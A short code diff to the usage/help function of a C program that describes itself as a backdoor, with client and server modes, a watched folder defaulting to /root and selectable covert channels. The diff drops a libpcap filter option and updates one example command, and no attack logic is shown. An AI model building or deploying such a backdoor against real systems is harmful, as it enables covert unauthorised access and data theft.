@@ -20,11 +20,10 @@ void usage(char *name)
 	printf(" -s Use server mode: Act as backdoor. [default]\n");
 	printf(" -h Show this help listing.\n");
 	printf(" -i <arg> Remote host address for client mode. [default=127.0.0.1]\n");
-	printf(" -f <arg> Libpcap filter to use. [default=udp port 123]\n");
 	printf(" -w <arg> Folder to watch. [default=/root]\n");
 	printf(" -x [und] Covert channel to use. [default=udp]\n");
 	printf(" EXAMPLES:\t %s -c -i 192.168.0.1\n", name);
-	printf(" EXAMPLES:\t %s -s -i 192.168.0.2 -f udp port 53\n", name);
+	printf(" EXAMPLES:\t %s -s -i 192.168.0.2 -x n\n", name);
 
   exit(0);
 }
